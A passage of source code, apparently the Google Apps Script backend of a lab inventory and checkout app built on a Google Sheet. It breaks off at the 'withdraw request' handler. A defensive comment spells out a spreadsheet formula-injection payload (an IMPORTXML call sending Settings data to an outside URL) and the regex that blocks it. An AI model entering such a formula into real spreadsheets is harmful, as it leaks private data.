function bytesToBigInt_(bytes) {
  var hex = "";
  for (var i = 0; i < bytes.length; i++) {
    var b = bytes[i] & 0xff;
    hex += (b < 16 ? "0" : "") + b.toString(16);
  }
  return hex.length ? BigInt("0x" + hex) : BigInt(0);
}

function modPow_(base, exp, mod) {
  var ZERO = BigInt(0), ONE = BigInt(1), TWO = BigInt(2);
  var result = ONE;
  var b = base % mod;
  var e = exp;
  while (e > ZERO) {
    if (e % TWO === ONE) result = (result * b) % mod;
    e = e / TWO;
    b = (b * b) % mod;
  }
  return result;
}

// DER-encoded DigestInfo prefix for SHA-256
var SHA256_DIGEST_INFO_ = [
  0x30, 0x31, 0x30, 0x0d, 0x06, 0x09, 0x60, 0x86, 0x48, 0x01,
  0x65, 0x03, 0x04, 0x02, 0x01, 0x05, 0x00, 0x04, 0x20
];

function verifyRs256_(signingInput, sigBytes, nB64u, eB64u) {
  var nBytes = Utilities.base64DecodeWebSafe(nB64u);
  var n = bytesToBigInt_(nBytes);
  var e = bytesToBigInt_(Utilities.base64DecodeWebSafe(eB64u));
  var s = bytesToBigInt_(sigBytes);
  if (n === BigInt(0) || s >= n) return false;

  var k = nBytes.length;
  if (sigBytes.length !== k) return false;

  // EM = sig^e mod n, left-padded to exactly k bytes
  var hex = modPow_(s, e, n).toString(16);
  while (hex.length < k * 2) hex = "0" + hex;
  if (hex.length !== k * 2) return false;
  var em = [];
  for (var i = 0; i < k; i++) em.push(parseInt(hex.substr(i * 2, 2), 16));

  // Expected: 0x00 || 0x01 || 0xFF...FF || 0x00 || DigestInfo || SHA-256(input)
  var hash = Utilities.computeDigest(Utilities.DigestAlgorithm.SHA_256, signingInput);
  var tail = SHA256_DIGEST_INFO_.concat(hash.map(function (b) { return b & 0xff; }));
  var psLen = k - tail.length - 3;
  if (psLen < 8) return false;

  var expected = [0x00, 0x01];
  for (var j = 0; j < psLen; j++) expected.push(0xff);
  expected.push(0x00);
  expected = expected.concat(tail);
  if (expected.length !== em.length) return false;

  var diff = 0;
  for (var q = 0; q < em.length; q++) diff |= (em[q] ^ expected[q]);
  return diff === 0;
}

// ─── ADMIN CHECK ─────────────────────────────────────────────────────────────
function isAdmin(email) {
  var raw = readSettings()["admins"];
  if (raw === undefined) return false;
  try {
    var admins = JSON.parse(raw);
    return Array.isArray(admins) && normalizeEmails_(admins).indexOf(email) >= 0;
  } catch(e) { return false; }
}

// Entra UPNs are case-insensitive and users type them inconsistently, so the
// sheet's admin/member lists are compared case-insensitively.
function normalizeEmails_(list) {
  return list.map(function (x) { return String(x).trim().toLowerCase(); });
}

// ─── MEMBER CHECK ────────────────────────────────────────────────────────────
// If "members" key exists in Settings with a non-empty array, only those sign-in
// names can access the system. If the key is absent or empty, any account in the
// JHU tenant is allowed (backward compatible).
function isMember(email) {
  // An admin is a member by definition. Without this, filling in the allowlist and
  // forgetting your own address locks you out of your own lab — including out of
  // the Settings that would let you undo it, since doGet checks this too. The only
  // way back would be editing the sheet by hand.
  if (isAdmin(email)) return true;
  var raw = readSettings()["members"];
  if (raw === undefined) return true; // key not set → allow anyone in the JHU tenant
  try {
    var members = JSON.parse(raw);
    if (!Array.isArray(members) || members.length === 0) return true;
    return normalizeEmails_(members).indexOf(email) >= 0;
  } catch(e) { return true; }
}

// ─── FIRST-RUN SETUP ─────────────────────────────────────────────────────────
// Run once from the Apps Script editor (Run → setupNewLab) against a fresh
// spreadsheet: creates every tab with the correct headers and seeds Settings.
// Idempotent — existing tabs and existing settings keys are left untouched, so
// it is safe to re-run after adding a table.
function setupNewLab() {
  var created = [], seeded = [];

  var widened = [];
  Object.keys(TABLE_HEADERS).forEach(function(name) {
    var sheet = getSheet(name);
    if (!sheet) { getOrCreateSheet(name); created.push(name); return; }

    // Existing tab: append any columns it is missing, so re-running this upgrades
    // a sheet in place instead of leaving new fields silently unwritable.
    var have = sheetHeaders_(sheet, name);
    var missing = TABLE_HEADERS[name].filter(function (h) { return have.indexOf(h) < 0; });
    if (missing.length) {
      sheet.getRange(1, have.length + 1, 1, missing.length).setValues([missing]);
      widened.push(name + " (+" + missing.join(", ") + ")");
    }
  });

  var existing = readSettings();
  var defaults = {
    categories: JSON.stringify(["Robots & Motors","Sensors & Vision","Compute & Electronics",
                                "Wiring & Networking","Tools & Hardware","Consumables & Supplies",
                                "Safety & Facility","Other"]),
    admins:     JSON.stringify([String(INITIAL_ADMIN).trim().toLowerCase()]),
    members:    JSON.stringify([]),   // empty = anyone in the tenant may sign in
    slack_mode: "all",
  };
  Object.keys(defaults).forEach(function(k) {
    if (existing[k] === undefined) { writeSetting(k, defaults[k]); seeded.push(k); }
  });

  // A brand-new spreadsheet ships with an empty "Sheet1" that is now dead weight.
  var ss = SpreadsheetApp.getActiveSpreadsheet();
  var stray = ss.getSheetByName("Sheet1");
  if (stray && ss.getSheets().length > 1 && stray.getLastRow() === 0) ss.deleteSheet(stray);

  var msg = "LabTrack setup complete."
    + "\n  tabs created : " + (created.join(", ") || "(none — all existed)")
    + "\n  columns added: " + (widened.join(", ") || "(none — all up to date)")
    + "\n  settings set : " + (seeded.join(", ") || "(none — all existed)")
    + "\n  admins       : " + readSettings()["admins"]
    + "\n\nNext: Deploy → New deployment → Web app (Execute as: Me, Access: Anyone),"
    + "\nthen paste the /exec URL into LAB_CONFIG.apps_script_url in index.html.";
  Logger.log(msg);
  return msg;
}

// ─── DELETE LOG ──────────────────────────────────────────────────────────────
function logDeletion(type, name, details, deletedBy) {
  appendRow("DeleteLog", {
    date: new Date().toISOString().slice(0, 19).replace("T", " "),
    type: type, name: name, details: details, deletedBy: deletedBy,
  });
  sendSlack("🗑️", type + " Deleted: " + name, null, ["*Deleted by*\n" + deletedBy, "*Details*\n" + details], "normal");
}

// ─── AUDIT LOG ───────────────────────────────────────────────────────────────
// Logs every significant write action for accountability / troll detection.
// Columns: date | user | email | action | details
function logAudit(userName, userEmail, action, details) {
  appendRow("AuditLog", {
    date: new Date().toISOString().slice(0, 19).replace("T", " "),
    user: userName || "", email: userEmail || "", action: action, details: details || "",
  });
}

// ─── STORAGE LAYER ────────────────────────────────────────────────────────────
// The only code that knows the data lives in a Google Sheet. Everything else —
// auth, RBAC, Slack, digest, audit logging, and every action handler in
// doGet/doPost — is storage-agnostic and goes through the functions here.
//
// To move the data elsewhere (SharePoint Lists via Graph, a real database, …),
// reimplement this section and nothing else.
//
// Two things deliberately sit OUTSIDE this layer because they are not storage at
// all — they emit formatted spreadsheets as output artifacts, and have no
// equivalent after a migration. Both are marked SHEETS-ONLY:
//   · backupSpreadsheet()                    → superseded by the target store's own versioning
//   · doPost action "generatePurchaseSummary" → would become a generated file/export
//
// `match` throughout is either an id — compared leniently via idsMatch, because
// Sheets happily turns "007" into the number 7 — or a predicate over the row object.

// Canonical column order. Sheets are positional, so this is authoritative for
// writes. A typed store would use it only as the field list.
const TABLE_HEADERS = {
  Items:      ["id","name","cat","qty","unit","loc","minQty","img","desc","status","usedBy","serial","displayId","shared","consumable"],
  Deliveries: ["id","item","qty","unit","from","receivedBy","date","tracking","status"],
  Checkouts:  ["id","itemId","item","user","out","ret","status","checkedOutByEmail","groupEmails","qty","fromTime","toTime","notes"],
  Orders:     ["id","store","item","link","qty","unit","price","cat","requestedBy","reason","urgency","date","status","requestedByEmail"],
  Settings:   ["key","value"],
  DeleteLog:  ["date","type","name","details","deletedBy"],
  AuditLog:   ["date","user","email","action","details"],
  SlackQueue: ["time","emoji","title","details","fields"],
};

function getSheet(name) {
  return SpreadsheetApp.getActiveSpreadsheet().getSheetByName(name);
}

function getOrCreateSheet(name, headers) {
  var ss = SpreadsheetApp.getActiveSpreadsheet();
  var sheet = ss.getSheetByName(name);
  if (!sheet) {
    sheet = ss.insertSheet(name);
    var h = headers || TABLE_HEADERS[name];
    if (h && h.length > 0) {
      sheet.getRange(1, 1, 1, h.length).setValues([h]);
    }
  }
  return sheet;
}

// Turn one raw sheet row into the object the rest of the backend expects.
//
// A Sheet is not a store of strings: it parses what you write. "2026-08-18 09:00"
// comes back a Date, "09:00" comes back a Date in 1899, a serial number that
// happens to be all digits comes back a Number, "TRUE" comes back a boolean.
// Every rule in this file is written against strings, so the coercion has to be
// undone in exactly one place — here — and every reader has to go through it.
// test-sheets-coercion.js is the file that keeps that honest.
function normalizeRow_(headers, row) {
  var pad = function (n) { return String(n).padStart(2, "0"); };
  var ymd = function (d) { return d.getFullYear() + "-" + pad(d.getMonth() + 1) + "-" + pad(d.getDate()); };
  var hm  = function (d) { return pad(d.getHours()) + ":" + pad(d.getMinutes()); };
  var obj = {};
  headers.forEach(function (h, i) {
    var val = row[i];
    if (h === "usedBy") {
      if (typeof val === "string") {
        try { val = JSON.parse(val); } catch(e) { val = []; }
      }
      // Always ensure usedBy is a clean array of non-empty strings
      if (!Array.isArray(val)) val = [];
      else val = val.filter(function(x){ return x != null && x !== ""; });
    }
    if (["qty", "minQty"].indexOf(h) >= 0 && val !== "") {
      val = Number(val);
    }
    // itemId is a foreign key to Items.id, so it has to be the same type as the
    // key it points at. Coercing it to a Number turned any non-numeric id into
    // NaN, and NaN is falsy, so every "same item?" test quietly fell through to
    // comparing item *names* instead.
    if (h === "id" || h === "itemId") { val = val === "" || val == null ? (h === "itemId" ? "" : String(val)) : String(val); }
    // Ensure text fields are strings — Sheets auto-detects numbers in text cells
    // (e.g. a serial number "12345678" returns as the JS number 12345678)
    var textFields = ["name","loc","cat","desc","serial","unit","status","displayId","tags","item","store","requestedBy","reason","link","from","receivedBy","tracking","user","checkedOutByEmail","groupEmails","requestedByEmail","notes"];
    if (textFields.indexOf(h) >= 0 && typeof val !== "string") {
      val = val == null ? "" : String(val);
    }
    // Undo serializeCell_'s formula guard. Sheets normally eats the apostrophe
    // itself, so this usually finds nothing; doing it anyway means the value the
    // app reads is the value it wrote, whichever way the API behaves.
    if (typeof val === "string" && val.charAt(0) === "'" && FORMULA_LEAD_.test(val.slice(1))) val = val.slice(1);
    // Datetime fields — Sheets turns "YYYY-MM-DD HH:MM" into a Date object
    if (["out", "ret"].indexOf(h) >= 0) {
      if (val instanceof Date) val = ymd(val) + " " + hm(val);
      else if (val != null && typeof val !== "string") val = String(val);
    }
    if (h === "date") {
      if (val instanceof Date) val = ymd(val);
      else if (val != null && typeof val !== "string") val = String(val);
    }
    // A bare "09:00" is a time of day to Sheets, and comes back as a Date on
    // 1899-12-30. Left alone it fails minutes_()'s HH:MM match, which reads as
    // "no window" — and every daily booking window silently becomes all day.
    if (["fromTime", "toTime"].indexOf(h) >= 0) {
      if (val instanceof Date) val = hm(val);
      else if (val == null) val = "";
      else if (typeof val !== "string") val = String(val);
    }
    obj[h] = val;
  });
  return obj;
}

function sheetToJson(sheet) {
  if (!sheet) return [];
  const data = sheet.getDataRange().getValues();
  if (data.length < 2) return [];
  const headers = data[0];
  return data.slice(1).map(function (row) { return normalizeRow_(headers, row); });
}

// Read every row of a table as plain objects.
function readTable(name) {
  return sheetToJson(getSheet(name));
}

// Locate one row, keeping the sheet handle and row number alongside the parsed
// object. Private: only the writers below use the positional part.
function locateRow_(name, match) {
  var sheet = getSheet(name);
  if (!sheet) return null;
  var data = sheet.getDataRange().getValues();
  if (data.length < 2) return null;
  var headers = data[0];
  var idCol = headers.indexOf("id");
  for (var i = 1; i < data.length; i++) {
    // Normalized, not raw: callers hand this row straight to the booking rules,
    // which are written against strings. A raw row gives them Sheets' Date objects
    // and every rule quietly evaluates to "no conflict". See normalizeRow_().
    var obj = normalizeRow_(headers, data[i]);
    var hit = (typeof match === "function")
      ? match(obj)
      : (idCol >= 0 && idsMatch(data[i][idCol], match));
    if (hit) return { sheet: sheet, headers: headers, rowNum: i + 1, raw: data[i], obj: obj };
  }
  return null;
}

// Find one row, or null. The result is a snapshot — mutating it does nothing.
function findRow(name, match) {
  var hit = locateRow_(name, match);
  return hit ? hit.obj : null;
}

// Sheets cells hold scalars only, so arrays are serialized on the way in.
//
// Text that begins with = + - or @ is not text to a spreadsheet, it is a formula,
// and it runs the moment somebody opens the file. An item named
// =IMPORTXML("https://…?d="&JOIN(",",Settings!A1:B99),"//a") is a working
// exfiltration of the admin roster, typed into the Add Item box by anyone who can
// reach the app, and it lands in AuditLog and DeleteLog as well. A leading
// apostrophe is Sheets' own "this is text" marker and is not part of the stored
// value; normalizeRow_ strips one anyway if it comes back, so the round trip is
// exact whichever way the API behaves.
var FORMULA_LEAD_ = /^[=+\-@\t\r]/;
function serializeCell_(header, val) {
  if (header === "usedBy" && Array.isArray(val)) return JSON.stringify(val);
  if (val === undefined || val === null) return "";
  if (typeof val === "string" && FORMULA_LEAD_.test(val)) return "'" + val;
  return val;
}

// The sheet's own header row is authoritative for writes, not TABLE_HEADERS.
// A sheet created before a column was added still has the old header, and writing
// in canonical order would file values under the wrong headings — or into an
// unlabelled column that reads back as nothing, since reads go by the header row.
// Run setupNewLab() to add missing columns to an existing sheet.
function sheetHeaders_(sheet, name) {
  var lastCol = sheet.getLastColumn();
  if (lastCol > 0) {
    var row = sheet.getRange(1, 1, 1, lastCol).getValues()[0]
                   .filter(function (h) { return String(h) !== ""; });
    if (row.length) return row;
  }
  return TABLE_HEADERS[name] || [];
}

function appendRow(name, obj) {
  var sheet = getOrCreateSheet(name);
  var headers = sheetHeaders_(sheet, name);
  sheet.appendRow(headers.map(function(h) { return serializeCell_(h, obj[h]); }));
  // Keep ids textual — Sheets would otherwise render "0012" as 12 and break lookups.
  var idCol = headers.indexOf("id");
  if (idCol >= 0) sheet.getRange(sheet.getLastRow(), idCol + 1).setNumberFormat("@");
}

// Patch the named fields of one row, leaving every other column untouched (rows
// written by an older schema keep their extra columns). Returns the row as it was
// BEFORE the update, or null if no row matched.
function updateRow(name, match, patch) {
  var hit = locateRow_(name, match);
  if (!hit) return null;
  var row = hit.raw.slice();
  Object.keys(patch).forEach(function(f) {
    var col = hit.headers.indexOf(f);
    if (col >= 0 && patch[f] !== undefined) row[col] = serializeCell_(f, patch[f]);
  });
  hit.sheet.getRange(hit.rowNum, 1, 1, row.length).setValues([row]);
  return hit.obj;
}

// Returns the deleted row, or null — every caller logs what it removed.
function deleteRow(name, match) {
  var hit = locateRow_(name, match);
  if (!hit) return null;
  hit.sheet.deleteRow(hit.rowNum);
  return hit.obj;
}

// Drop every row but the header.
function clearTable(name) {
  var sheet = getSheet(name);
  if (!sheet) return;
  var n = sheet.getLastRow();
  if (n > 1) sheet.deleteRows(2, n - 1);
}

// Settings is key/value rather than a record table, so it gets its own pair.
// Settings keys the frontend needs in order to draw itself. Everything else —
// admins, members, and whatever gets added later — is an admin's to read.
var MEMBER_SETTINGS_ = ["categories", "slack_mode", "cat_prefixes", "last_backup"];

function visibleSettings_(admin) {
  var all = readSettings();
  if (admin) return all;
  var out = {};
  MEMBER_SETTINGS_.forEach(function (k) { if (all[k] !== undefined) out[k] = all[k]; });
  return out;
}

function readSettings() {
  var out = {};
  var sheet = getSheet("Settings");
  if (!sheet) return out;
  var data = sheet.getDataRange().getValues();
  for (var i = 1; i < data.length; i++) out[String(data[i][0])] = data[i][1];
  return out;
}

function writeSetting(key, value) {
  var sheet = getOrCreateSheet("Settings");
  var data = sheet.getDataRange().getValues();
  for (var i = 1; i < data.length; i++) {
    if (String(data[i][0]) === String(key)) {
      sheet.getRange(i + 1, 2).setValue(value);
      return;
    }
  }
  sheet.appendRow([key, value]);
}

function jsonResponse(data) {
  return ContentService
    .createTextOutput(JSON.stringify(data))
    .setMimeType(ContentService.MimeType.JSON);
}

function idsMatch(sheetVal, targetId) {
  var a = String(sheetVal).trim();
  var b = String(targetId).trim();
  if (a === b) return true;
  try { if (Number(a) === Number(b) && !isNaN(Number(a))) return true; } catch(e) {}
  if (a.replace(/\.0+$/, "") === b.replace(/\.0+$/, "")) return true;
  return false;
}

// ─── GET ─────────────────────────────────────────────────────────────────────
function doGet(e) {
  try {
    const token = (e && e.parameter && e.parameter.token) || "";
    const user = verifyToken(token);
    if (!user) {
      return jsonResponse({ error: "Unauthorized", detail: "Token verification failed" });
    }
    if (!isMember(user.email)) {
      return jsonResponse({ error: "NotMember", detail: "Your account is not authorized to access this lab's system. Contact a lab admin." });
    }

    return jsonResponse({
      items: readTable("Items"),
      deliveries: readTable("Deliveries"),
      checkouts: readTable("Checkouts"),
      orders: readTable("Orders"),
      // The roster is not lab-wide reading. A member gets the keys the app itself
      // needs to render; an admin gets the tab. Nothing sensitive lives here today,
      // and this is so that stays true after the first person parks a key in it.
      settings: visibleSettings_(isAdmin(user.email)),
      userRole: isAdmin(user.email) ? "admin" : "member",
    });
  } catch (err) {
    return jsonResponse({ error: "Server error", detail: err.message });
  }
}

// ─── POST ────────────────────────────────────────────────────────────────────
function doPost(e) {
  try {
  const body = JSON.parse(e.postData.contents);
  const user = verifyToken(body.token);
  if (!user) {
    return jsonResponse({ error: "Unauthorized", detail: "Token verification failed for POST" });
  }
  if (!isMember(user.email)) {
    return jsonResponse({ error: "NotMember", detail: "Your account is not authorized to access this lab's system." });
  }

  const action = body.action;
  const userEmail = user.email || "";
  const userName = user.name || userEmail;
  const admin = isAdmin(userEmail);

  // ── Add Item ──────────────────────────────────────────────────────────────
  if (action === "addItem") {
    var addLock = LockService.getScriptLock();
    addLock.waitLock(10000);
    try {
      const it = body.item;
      // Always generate displayId server-side (inside the lock) to prevent collisions.
      const allItems = readTable("Items");
      const parsed = parseDisplayId_(it.displayId);
      if (it.consumable) {
        // Consumables don't get a label. You don't put a sticker on a tube of
        // thread-lock, and a number nobody prints is a number nobody maintains.
        it.displayId = "";
      } else if (!parsed || parsed.sub === null) {
        // Plain item. The counter runs per prefix, so each category starts at 001 —
        // one shared counter only told you how many items existed in total, which
        // is not what a label on a shelf is for.
        var prefix = parsed ? parsed.prefix : "GEN";
        var maxNum = 0;
        allItems.forEach(function (i) {
          var p = parseDisplayId_(i.displayId);
          if (p && p.prefix === prefix && p.num > maxNum) maxNum = p.num;
        });
        it.displayId = mainId_(prefix, maxNum + 1);
      } else {
        // Split unit: next free suffix under this base, chosen inside the lock so
        // concurrent "Add Unit" calls can't land on the same number.
        //
        // The base number itself comes from the browser, which picked it by reading
        // its own copy of the item list — up to a poll old, and per-browser if the
        // admin has edited category prefixes locally. Two people adding different
        // models at the same time both got told CE-004, and ended up printing that
        // base on two unrelated shelves. If the base is already spoken for by an
        // item of another name, take the next free one instead.
        var baseId = mainId_(parsed.prefix, parsed.num);
        var baseOwner = "";
        allItems.forEach(function (i) {
          var p = parseDisplayId_(i.displayId);
          if (p && mainId_(p.prefix, p.num) === baseId && !baseOwner) baseOwner = String(i.name || "");
        });
        if (baseOwner && baseOwner !== String(it.name || "")) {
          var nextNum = 0;
          allItems.forEach(function (i) {
            var p = parseDisplayId_(i.displayId);
            if (p && p.prefix === parsed.prefix && p.num > nextNum) nextNum = p.num;
          });
          baseId = mainId_(parsed.prefix, nextNum + 1);
        }
        var maxSub = 0;
        allItems.forEach(function (i) {
          var p = parseDisplayId_(i.displayId);
          if (p && p.sub !== null && mainId_(p.prefix, p.num) === baseId && p.sub > maxSub) maxSub = p.sub;
        });
        it.displayId = baseId + "-" + String(maxSub + 1).padStart(LABEL_SUB_DIGITS, "0");
      }
      appendRow("Items", it);
      sendSlack("📦", "New Item Added: " + it.name, null, ["*Category*\n" + (it.cat||"—"), "*Qty*\n" + (it.qty||0) + " " + (it.unit||""), "*Location*\n" + (it.loc||"—"), "*Added by*\n" + userName]);
      logAudit(userName, userEmail, "AddItem", it.name + " | qty:" + (it.qty||0) + " " + (it.unit||"") + " | cat:" + (it.cat||"") + " | id:" + (it.displayId||""));
      return jsonResponse({ ok: true, displayId: it.displayId });
    } finally {
      addLock.releaseLock();
    }
  }

  // ── Update Item ───────────────────────────────────────────────────────────
  if (action === "updateItem") {
    const it = body.item;
    // Anyone may correct what an item *is like* — where it lives, how many there
    // are, what it looks like. What an item *is* — whether it is shared, whether it
    // is a consumable, what number is printed on its sticker, and whether it counts
    // as on the shelf — changes how every rule treats it, so that is an admin's.
    const fields = ["name", "cat", "qty", "unit", "loc", "minQty", "img", "desc", "serial"];
    const adminFields = ["status", "displayId", "shared", "consumable"];
    if (admin) Array.prototype.push.apply(fields, adminFields);
    const refused = adminFields.filter(function (f) { return !admin && it[f] !== undefined; });
    const patch = {};
    fields.forEach(f => { if (it[f] !== undefined) patch[f] = it[f]; });

    if (!updateRow("Items", it.id, patch)) {
      return jsonResponse({ error: "Item not found", detail: "No item with id " + it.id });
    }
    logAudit(userName, userEmail, "UpdateItem", (it.name||"") + " | id:" + (it.displayId||it.id||"") +
      (refused.length ? " | ignored (admin only): " + refused.join(",") : ""));
    // Reported rather than refused: the browser sends the whole item back, so a
    // member editing the location of a shared item would otherwise be told off for
    // a field they never touched. The fields simply do not move.
    return jsonResponse({ ok: true, ignored: refused });
  }

  // ── Use some of a consumable ──────────────────────────────────────────────
  // The one write that has to be arithmetic rather than an assignment. Everywhere
  // else the browser sends the value it wants; here it sends what it *took*, and
  // the subtraction happens inside the lock against the number actually on the
  // sheet. Two people helping themselves from the same box of gloves at the same
  // time used to both read 20, both write 17, and three pairs left no trace.
  if (action === "useConsumable") {
    var useLock = LockService.getScriptLock();
    useLock.waitLock(10000);
    try {
      const used = Number(body.used);
      if (!isFinite(used) || used <= 0) {
        return jsonResponse({ error: "Bad quantity", detail: "How many were used has to be a number above zero" });
      }
      const item = findRow("Items", body.itemId);
      if (!item) return jsonResponse({ error: "Item not found", detail: "No item with id " + body.itemId });
      // A supply with no count has nothing to deduct — that is what Notify is for.
      if (item.qty === "" || item.qty === null || item.qty === undefined) {
        return jsonResponse({ error: "Not tracked", detail: item.name + " has no quantity to deduct — report it as running low instead" });
      }
      const before = Number(item.qty) || 0;
      const after = Math.max(0, before - used);
      updateRow("Items", body.itemId, { qty: after });
      logAudit(userName, userEmail, "UseConsumable", item.name + " | used:" + (before - after) + " " + (item.unit||"") + " | left:" + after);
      // Reported back so the browser can correct its own arithmetic rather than
      // keep the number it guessed from a list that was a poll old.
      return jsonResponse({ ok: true, qty: after, used: before - after, name: item.name });
    } finally {
      useLock.releaseLock();
    }
  }

  // ── Delete Item (admin only) ──────────────────────────────────────────────
  if (action === "deleteItem") {
    if (!admin) {
      return jsonResponse({ error: "Forbidden", detail: "Only admins can delete items" });
    }
    const itemId = body.itemId;
    const row = findRow("Items", itemId);
    if (!row) {
      return jsonResponse({ error: "Item not found", detail: "No item with id " + itemId });
    }
    // Log before destroying, so a failure here can't lose the audit trail.
    var itemName = row.name || "Unknown";
    var details = "cat:" + (row.cat||"") + " qty:" + (row.qty||"") + " loc:" + (row.loc||"") + " serial:" + (row.serial||"");
    logDeletion("Item", itemName, details, userName);
    logAudit(userName, userEmail, "DeleteItem", itemName + " | " + details);
    deleteRow("Items", itemId);
    return jsonResponse({ ok: true });
  }

  // ── Add Delivery ──────────────────────────────────────────────────────────
  if (action === "addDelivery") {
    const d = body.delivery;
    appendRow("Deliveries", d);
    sendSlack("🚚", "Delivery Received: " + d.item, null, ["*Qty*\n" + d.qty + " " + d.unit, "*Supplier*\n" + (d.from||"—"), "*Received by*\n" + (d.receivedBy||userName), "*Tracking*\n" + (d.tracking||"—")]);
    logAudit(userName, userEmail, "AddDelivery", d.item + " × " + d.qty + " " + (d.unit||"") + " from " + (d.from||"—"));
    return jsonResponse({ ok: true });
  }

  // ── Add Checkout ──────────────────────────────────────────────────────────
  if (action === "addCheckout") {
    const c = body.checkout;

    // The row says who is on the hook for returning it and who may edit or
    // withdraw it, so it has to be the person who actually asked. Admins log
    // checkouts on other people's behalf; members only ever book for themselves.
    if (!admin) {
      c.checkedOutByEmail = userEmail;
      c.user = userName;
    }
    // Asking is not deciding: a request is written Pending or Active by
    // waitReason_ below, never by whatever the browser put in the field.
    c.status = "Active";

    const bad = badRange_(c);
    if (bad) return jsonResponse({ error: "Bad dates", detail: bad });

    if (leadTooFar_(c)) {
      return jsonResponse({ error: "Too far ahead",
        detail: "Bookings can start at most " + MAX_LEAD_DAYS + " days from now" });
    }

    // Re-checked here because the browser's view of who holds what is a poll old,
    // and two people can book the same slot inside that window.
    const clash = bookingConflict_(c, null);
    if (clash) return jsonResponse({ error: "Clash", detail: clash });

    // Other people already queuing for the same slot. Reported, never used to
    // refuse — the admin is the one who picks between them.
    const rivals = competing_(c, c.id);
    // Long holds wait for an admin, and so does anything that would step over
    // someone already waiting. The item stays available until then — nothing is
    // reserved by asking, or a rejected request would quietly take it away.
    const reason = waitReason_(c, c.id);
    if (reason) c.status = CHECKOUT_PENDING;

    appendRow("Checkouts", c);

    if (reason) {
      const why = reason === "long"
        ? "Longer than " + MAX_DAYS_WITHOUT_APPROVAL + " days"
        : "Someone is already waiting for this slot";
      sendSlack("⏳", "Approval Needed: " + c.item, why +
        (rivals.length ? " — " + rivals.length + " other request" + (rivals.length>1?"s":"") + " for the same slot" : ""),
        ["*Person*\n" + c.user, "*From*\n" + (c.out||"—"), "*Until*\n" + (c.ret||"—")], "high");
      logAudit(userName, userEmail, "CheckoutPending", c.item + " → " + c.user + " | until:" + (c.ret||"—") +
        " | why:" + reason + (rivals.length ? " | competing:" + rivals.length : ""));
      return jsonResponse({ ok: true, pending: true, reason: reason, competing: rivals });
    }

    // Only if it starts now. A booking for a fortnight's time is on the calendar,
    // not off the shelf — syncItemStatuses() marks it when the day arrives.
    if (bookingLiveNow_(c)) updateItemStatus(c.itemId, c.item, "In Use", c.user, "add");
    sendSlack("🔑", "Item Checked Out: " + c.item, null, ["*Person*\n" + c.user, "*Date*\n" + (c.out||"—"), "*Return by*\n" + (c.ret||"—")]);
    logAudit(userName, userEmail, "Checkout", c.item + " → " + c.user + " | return by:" + (c.ret||"—"));
    return jsonResponse({ ok: true });
  }

  // ── Approve / reject a long checkout (admin only) ─────────────────────────
  if (action === "decideCheckout") {
    if (!admin) return jsonResponse({ error: "Forbidden", detail: "Only admins can approve checkouts" });
    const co = findRow("Checkouts", body.checkoutId);
    if (!co) return jsonResponse({ error: "Checkout not found" });
    if (co.status !== CHECKOUT_PENDING) return jsonResponse({ error: "Not pending", detail: "This request is already " + co.status });

    if (body.approve) {
      // Nothing was reserved while this waited, so the slot may be gone. Approving
      // blindly would hand the same item to two people.
      const gone = bookingConflict_(co, co.id);
      if (gone) return jsonResponse({ error: "Clash", detail: "Taken while this was waiting \u2014 " + gone });
      const item = findRow("Items", co.itemId ? co.itemId : function (r) { return r.name === co.item; });
      const shared = !!item && (item.shared === true || String(item.shared).toLowerCase() === "true");
      const holders = Array.isArray(item && item.usedBy) ? item.usedBy : [];
      if (item && !shared && item.status === "In Use" && holders.indexOf(co.user) < 0) {
        return jsonResponse({ error: "Clash", detail: "Someone checked out " + co.item + " while this was waiting" });
      }
      updateRow("Checkouts", body.checkoutId, { status: "Active" });
      if (bookingLiveNow_(co)) updateItemStatus(co.itemId, co.item, "In Use", co.user, "add");
      sendSlack("✅", "Long Checkout Approved: " + co.item, null, ["*Person*\n" + co.user, "*Until*\n" + (co.ret||"—"), "*By*\n" + userName]);
      logAudit(userName, userEmail, "CheckoutApproved", co.item + " → " + co.user);
    } else {
      updateRow("Checkouts", body.checkoutId, { status: "Rejected" });
      sendSlack("🚫", "Long Checkout Rejected: " + co.item, null, ["*Person*\n" + co.user, "*By*\n" + userName], "high");
      logAudit(userName, userEmail, "CheckoutRejected", co.item + " → " + co.user);
    }
    return jsonResponse({ ok: true });
  }

  // ── Edit a request that is still waiting ─────────────────────────────────
  // The usual reason to edit is that the app has just told you your slot collides
  // with someone else's. Making you cancel and retype the whole thing to move it
  // by two hours would be silly.
  if (action === "updateCheckout") {
    const co = findRow("Checkouts", body.checkoutId);
    if (!co) return jsonResponse({ error: "Checkout not found" });
    if (co.status !== CHECKOUT_PENDING) {
      return jsonResponse({ error: "Not pending", detail: "Only a request still waiting for approval can be edited — this one is " + co.status });
    }
    const coEmail = String(co.checkedOutByEmail || "").trim().toLowerCase();
    if (!admin && coEmail && userEmail !== coEmail) {
      return jsonResponse({ error: "Forbidden", detail: "Only the person who asked for this, or an admin, can change it" });
    }

    // Whitelisted: everything a requester is allowed to move. Taking body.checkout
    // wholesale would let a member patch status:"Active" and approve themselves.
    const patch = {};
    ["out", "ret", "fromTime", "toTime", "groupEmails"].forEach(function (k) {
      if (body.checkout && body.checkout[k] !== undefined) patch[k] = body.checkout[k];
    });
    const merged = Object.assign({}, co, patch);

    const badEdit = badRange_(merged);
    if (badEdit) return jsonResponse({ error: "Bad dates", detail: badEdit });

    if (leadTooFar_(merged)) {
      return jsonResponse({ error: "Too far ahead",
        detail: "Bookings can start at most " + MAX_LEAD_DAYS + " days from now" });
    }
    const blocked = bookingConflict_(merged, co.id);
    if (blocked) return jsonResponse({ error: "Clash", detail: blocked });

    // Editing re-runs the same rules. Shorten it under the limit AND off everyone
    // else's slot, and the reason it needed an admin is gone, so it just becomes
    // a checkout. Still overlapping someone who is waiting keeps it in the queue.
    const reason = waitReason_(merged, co.id);
    const stillPending = !!reason;
    patch.status = stillPending ? CHECKOUT_PENDING : "Active";
    updateRow("Checkouts", co.id, patch);

    if (!stillPending) {
      if (bookingLiveNow_(merged)) updateItemStatus(co.itemId, co.item, "In Use", co.user, "add");
      sendSlack("🔑", "Request Shortened — Now Active: " + co.item, "No longer needs approval",
        ["*Person*\n" + co.user, "*From*\n" + (merged.out||"—"), "*Return by*\n" + (merged.ret||"—")]);
    }
    logAudit(userName, userEmail, "CheckoutEdited", co.item + " → " + co.user +
      " | " + (merged.out||"—") + " to " + (merged.ret||"—") + " | " + patch.status);
    return jsonResponse({ ok: true, pending: stillPending, reason: reason, competing: stillPending ? competing_(merged, co.id) : [] });
  }

  // ── Withdraw your own request ─────────────────────────────────────────────
